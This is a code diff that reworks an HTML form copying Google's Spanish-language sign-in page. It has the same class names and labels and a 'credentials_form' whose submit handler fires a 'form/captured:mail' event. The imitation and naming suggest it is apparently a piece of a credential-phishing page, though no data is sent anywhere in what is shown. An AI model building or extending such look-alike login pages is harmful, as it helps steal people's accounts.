@@ -1,71 +1,55 @@
----
-
----
-
 <form id="credentials_form" method="post">
   <section class="Em2Ord">
     <header class="vYeFie" aria-hidden="true"></header>
+
     <div class="yTaH4c">
-      <div>
-        <div class="AFTWye vEQsqe">
-          <div class="rFrNMe X3mtXb UOsO2 ToAxb zKHdkd sdJrJc Tyc9J">
-            <div class="aCsJod oJeWuf">
-              <div class="aXBtI Wic03c">
-                <div class="Xb9hP">
-                  <input
-                    type="email"
-                    class="whsOnd zHQkBf"
-                    autocomplete="username webauthn"
-                    spellcheck="false"
-                    tabindex="0"
-                    aria-label="Correo electrónico o teléfono"
-                    aria-disabled="false"
-                    autocapitalize="none"
-                  />
-                  <div class="AxOyFc snByac" aria-hidden="true">
-                    Correo electrónico o teléfono
-                  </div>
+      <!-- Campo de email -->
+      <div class="AFTWye vEQsqe">
+        <div class="rFrNMe X3mtXb UOsO2 ToAxb zKHdkd sdJrJc Tyc9J" onfocus="this.classList.add('u3bW4e');" onblur="this.classList.remove('u3bW4e');">
+          <div class="aCsJod oJeWuf">
+            <div class="aXBtI Wic03c">
+              <div class="Xb9hP">
+                <input
+                  type="email"
+                  id="email"
+                  name="email"
+                  class="whsOnd zHQkBf"
+                  autocomplete="username webauthn"
+                  spellcheck="false"
+                  tabindex="0"
+                  aria-label="Correo electrónico o teléfono"
+                  aria-disabled="false"
+                  autocapitalize="none"
+                />
+                <div class="AxOyFc snByac" aria-hidden="true">
+                  Correo electrónico o teléfono
                 </div>
-                <div class="i9lrp mIZh1c"></div>
-                <div class="OabDMe cXrdqd Y2Zypf"></div>
               </div>
+              <div class="i9lrp mIZh1c"></div>
+              <div class="OabDMe cXrdqd Y2Zypf"></div>
             </div>
           </div>
         </div>
+      </div>
 
-        <div class="dMNVAe">
-          <button type="submit">¿Has olvidado tu correo electrónico?</button>
-        </div>
-
-        <input
-          type="password"
-          name="hiddenPassword"
-          class="Hvu6D"
-          tabindex="-1"
-          aria-hidden="true"
-          spellcheck="false"
-        />
+      <!-- Botón olvidar email -->
+      <div class="dMNVAe">
+        <button type="submit" aria-label="Recuperar correo">
+          ¿Has olvidado tu correo electrónico?
+        </button>
       </div>
     </div>
   </section>
 </form>
 
 <script>
-  let cred_form = document.getElementById("#credentials_form");
+  const credForm = document.getElementById("credentials_form");
 
-  cred_form?.addEventListener("submit", (e) => {
-    e.preventDefault();
+  const handleSubmit = (ev: SubmitEvent) => {
+    ev.preventDefault();
+    const custom = new CustomEvent("form/captured:mail", { detail: true });
+    document.dispatchEvent(custom);
+  };
 
-    document.dispatchEvent(
-      new CustomEvent("form/captured:mail", { detail: true })
-    );
-  });
-
-  function sendMessage() {
-    const message = "Hola desde el hijo";
-    // Dispara un evento personalizado
-    document.dispatchEvent(
-      new CustomEvent("messageFromChild", { detail: message })
-    );
-  }
+  credForm?.addEventListener("submit", handleSubmit);
 </script>
